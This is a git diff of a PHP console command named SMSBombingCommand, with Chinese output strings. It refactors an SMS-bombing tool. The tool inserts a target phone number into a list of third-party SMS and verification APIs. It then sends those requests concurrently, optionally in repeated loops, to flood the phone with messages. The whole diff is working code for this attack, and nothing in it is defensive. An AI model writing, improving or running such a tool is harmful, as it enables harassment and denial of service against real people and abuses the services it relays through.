@@ -48,35 +48,38 @@ class SMSBombingCommand extends SingleCommandApplication
         $num = $input->getOption('num');
         $loop = $input->getOption('loop');
         $phone = $input->getArgument('phone');
+        $client = new Client(['verify' => false, 'timeout' => $input->getOption('timeout')]);
 
         do {
             $apis = $num == 'all' ? $apis->toArray() : ($num > $apis->count() ? $apis->toArray() : $apis->random($num)->toArray());
             $requests = function () use ($apis, $phone) {
+                $fn = fn ($phone, $url): string|array => str_replace('[phone]', $phone, $url);
                 foreach ($apis as $api) {
-                    $url = str_replace('[phone]', $phone, $api['url']);
-                    $body = is_array($api['data']) ? array_map(fn ($item): string|array => str_replace('[phone]', $phone, $item), $api['data']) : [];
-
+                    $url = $fn($phone, $api['url']);
+                    $body = is_array($api['data']) ? array_map(fn ($item): string|array => $fn($phone, $item), $api['data']) : [];
                     $body = isset($api['form']) ? http_build_query($body) : json_encode($body, JSON_UNESCAPED_UNICODE);
                     yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], $body);
                 }
             };
 
-            $fn = fn ($body) => mb_strlen($body) > 128 ? mb_substr($body, 0, $input->getOption('length')) : $body;
-
-            $pool = new Pool(new Client(['verify' => false, 'timeout' => $input->getOption('timeout')]), $requests(), [
-                'concurrency' => 5,
-                'fulfilled' => function (Response $response, $index) use ($output, $fn): void {
-                    $body = $fn($response->getBody());
-                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<comment>{$body}</comment>");
-                },
-                'rejected' => function (RequestException|ConnectException $reason, $index) use ($output, $fn): void {
-                    $message = $reason instanceof ConnectException ? '请求超时， 稍后重试！' : $fn($reason->getMessage());
-                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<error>{$message}</error>");
-                },
-            ]);
-
-            $promise = $pool->promise();
-            $promise->wait();
+            $fn = fn ($body): string => mb_strlen($body) > 128 ? mb_substr($body, 0, $input->getOption('length')) : $body;
+            (new Pool(
+                $client,
+                $requests(),
+                [
+                    'concurrency' => 5,
+                    'fulfilled' => function (Response $response, $index) use ($output, $fn): void {
+                        $body = $fn($response->getBody());
+                        $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<comment>{$body}</comment>");
+                    },
+                    'rejected' => function (RequestException|ConnectException $reason, $index) use ($output, $fn): void {
+                        $message = $reason instanceof ConnectException ? '请求超时， 稍后重试！' : $fn($reason->getMessage());
+                        $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<error>{$message}</error>");
+                    },
+                ]
+            ))
+                ->promise()
+                ->wait();
 
             if ($loop > 0 && $i < $loop) {
                 $i++;
